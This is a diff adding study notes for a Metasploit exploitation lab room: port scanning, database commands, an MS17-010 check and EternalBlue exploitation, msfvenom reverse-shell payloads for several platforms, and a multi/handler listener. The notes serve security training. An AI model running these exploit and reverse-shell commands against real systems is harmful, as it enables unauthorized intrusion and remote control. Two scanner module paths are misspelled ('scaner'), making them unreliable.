@@ -3432,39 +3432,165 @@ After successful exploitation, Metasploit creates a session.
 
 ### Room 3 - Metasploit: Exploitation
 
+**Learning Objectives**
+- Scan target systems using Metasploit
+- Use the Metasploit database feature
+- Conduct vulnerability scans
+- Exploit vulnerable services
+- Generate payloads with msfvenom
+- Catch shells with multi/handler
 
+---
 
+#### Scanning with Metasploit
 
+**Port Scanning Modules**
+```bash
+search portscan
+use auxiliary/scanner/portscan/tcp
+```
 
+**Common options:**  
+| **Option**  | **Purpose**                  |
+|-------------|------------------------------|
+| RHOSTS      | Target IP(s)                 |
+| PORTS       | Port range (e.g. 1-1000)     |
+| THREADS     | Number of concurrent threads |
+| CONCURRENCY | Targets scanned at once      |
 
+```Bash
+nmap -sS 10.10.10.10
+db_nmap -sV -p- 10.10.10.10   # Saves results to the database
+```
+**Useful Service Scanners**
+- `auxiliary/scanner/smb/smb_version`
+- `auxiliary/scaner/smb/smb_enumshares`
+- `auxiliary/scaner/discovery/udp_sweep`
 
+---
 
+#### Metasploit Database
 
+Useful for managing multiple targets
 
+**Setup (if needed):**
+```Bash
+systemctl start postgresql
+sudo -u postgres msfdb init
+```
 
+**Common Database Commands**  
+| **Command**       | **Purpose**                |
+|-------------------|----------------------------|
+| db_status         | Check database connection  |
+| workspace         | List / switch workspaces   |
+| workspace -a name | Create a workspace         |
+| db_nmap           | Run Nmap and save results  |
+| hosts             | List discovered hosts      |
+| services          | List discovered services   |
+| vulns             | List found vulnerabilities |
+| hosts -R          | Set RHOSTS from database   |
 
+---
 
+#### Vulnerability Scanning
 
+**Search for relevant scanners:  
+```Bash
+search type:auxiliary smb
+search ms17-010
+```
 
+**Example:**
+```Bash
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 10.10.10.10
+run
+```
 
+---
 
+#### Exploitation Workflow
+1. Select the exploit
+```Bash
+use exploit/windows/smb/ms17_010_eternalblue
+```
+2. Set options
+```Bash
+set RHOSTS 10.10.10.10
+set LHOST 10.10.14.5
+set LPORT 4444
+```
+3. Choose a payload (optional)
+```Bash
+show payloads
+set payload windows/x64/meterpreter/reverse_tcp
+```
+4. Run the exploit
+```Bash
+exploit
+# or
+run
+exploit -z    # Background the session automatically
+```
+5. Manage sessions
+```Bash
+sessions                # List sessions
+sessions -i 1           # Interact with session 1
+background              # Background current session (or Ctrl+Z)
+```
 
+---
 
+#### msfvenom - Payload Generation
 
+**Basic syntax:**  
+```Bash
+msfvenom -p <payload> LHOST=<your_ip> LPORT=<port> -f <format> > output_file
+```
 
+**Command Examples**
+| Target  | Command                                                                                     |
+| ------- | ------------------------------------------------------------------------------------------- |
+| Windows | msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > shell.exe   |
+| Linux   | msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > shell.elf |
+| PHP     | msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=4444 -f raw > shell.php       |
+| Python  | msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=4444 -f raw > shell.py            |
+| ASP     | msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f asp > shell.asp   |
 
+---
 
+#### Catching the Shell (multi/handler)
 
+```Bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp   # Must match the payload you generated
+set LHOST 10.10.X.X
+set LPORT 4444
+run
+```
 
+Once the target executes the payload, you will receive a session.
 
+---
 
+#### Quick Reference
 
+| Goal                  | Command                 |
+| --------------------- | ----------------------- |
+| Search modules        | search eternalblue      |
+| Use a module          | use exploit/...         |
+| Show options          | show options            |
+| Set a value           | set RHOSTS 10.10.10.10  |
+| Set global value      | setg RHOSTS 10.10.10.10 |
+| Run module            | run or exploit          |
+| List sessions         | sessions                |
+| Interact with session | sessions -i 1           |
+| Background session    | background or Ctrl+Z    |
 
+---
 
-
-
-
-
+**End of Room 3**
 
 </details> <!-- Ends Room 3 -->
 
